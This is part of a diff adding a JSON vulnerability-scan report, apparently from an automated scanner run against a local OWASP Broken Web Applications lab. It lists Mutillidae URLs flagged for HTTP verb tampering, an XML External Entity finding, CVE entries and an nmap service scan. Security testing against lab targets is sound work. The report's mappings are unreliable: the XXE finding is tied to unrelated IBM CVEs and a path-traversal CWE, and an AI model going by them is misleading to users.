+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=privilege-escalation.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=client-side-control-challenge.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=51",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=credits.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=redirectandlog.php&forwardurl=http://www.owasp.org",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=secret-administrative-pages.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=27",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=28",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=29",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=44",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=directory-browsing.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=9",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=user-agent-impersonation.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=45",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=upload-file.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=46",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=phpinfo.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=robots-txt.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=43",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=framing.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=22",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=ssl-misconfiguration.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/webservices/soap/ws-hello-world.php?wsdl",
+                    "payload": "PUT"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=installation.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=documentation/vulnerabilities.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=hackers-for-charity.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=usage-instructions.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=./documentation/vulnerabilities.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=php-errors.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/styles/global.css",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/preferences?hl=en",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/advanced_search?hl=en-GB&authuser=0",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/intl/en/ads/",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/services/",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/intl/en/about.html",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/intl/en/policies/privacy/",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/intl/en/policies/terms/",
+                    "payload": "POST"
+                }
+            ],
+            "no_cves": "No Verb Tampering CVE's in the last 4 months"
+        },
+        {
+            "Vulnerability": "XML External Entity Injection",
+            "num_vulnerabilities": 1,
+            "description": "No description available",
+            "remediation steps": "No remediation available",
+            "vulnerabilities": [
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=xml-validator.php",
+                    "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+                }
+            ],
+            "recent_cves": [
+                {
+                    "cve_id": "CVE-2023-40683",
+                    "descriptions": [
+                        "IBM OpenPages with Watson 8.3 and 9.0 could allow remote attacker to bypass security restrictions, caused by insufficient authorization checks. By authenticating as an OpenPages user and using non-public APIs, an attacker could exploit this vulnerability to bypass security and gain unauthorized administrative access to the application.  IBM X-Force ID:  264005."
+                    ]
+                },
+                {
+                    "cve_id": "CVE-2023-38738",
+                    "descriptions": [
+                        "\nIBM OpenPages with Watson 8.3 and 9.0 could provide weaker than expected security in a OpenPages environment using Native authentication. If OpenPages is using Native authentication an attacker with access to the OpenPages database could through a series of specially crafted steps could exploit this weakness and gain unauthorized access to other OpenPages accounts. IBM X-Force ID: 262594.\n\n"
+                    ]
+                },
+                {
+                    "cve_id": "CVE-2023-35020",
+                    "descriptions": [
+                        "IBM Sterling Control Center 6.3.0 could allow a remote attacker to traverse directories on the system. An attacker could send a specially crafted URL request containing \"dot dot\" sequences (/../) to view arbitrary files on the system.  IBM X-Force ID:  257874."
+                    ]
+                }
+            ],
+            "cwe_link": "https://cwe.mitre.org/data/definitions/22.html"
+        },
+        {
+            "Vulnerability": "Server Side Template Injection",
+            "num_vulnerabilities": 0
+        }
+    ],
+    "nmap_log": "Nmap Version: (7, 94)\nNmap Command: nmap 192.168.232.135 -p 80 -v -sV -sC -T3\nNmap Scan results:\nHost: 192.168.232.135\nPort 80: open - http - Apache httpd 2.2.14\nHTTP Title: owaspbwa OWASP Broken Web Applications\nhttp-server-header: Apache/2.2.14 (Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.30 with Suhosin-Patch proxy_html/3.0.1 mod_python/3.3.1 Python/2.6.5 mod_ssl/2.2.14 OpenSSL/0.9.8k Phusion_Passenger/4.0.38 mod_perl/2.0.4 Perl/v5.10.1\nProduct: Apache httpd\nVersion: 2.2.14\nExtra Info: (Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.30 with Suhosin-Patch proxy_html/3.0.1 mod_python/3.3.1 Python/2.6.5 mod_ssl/2.2.14 OpenSSL/0.9.8k Phusion_Passenger/4.0.38 mod_perl/2.0.4 Perl/v5.10.1\n"
+}
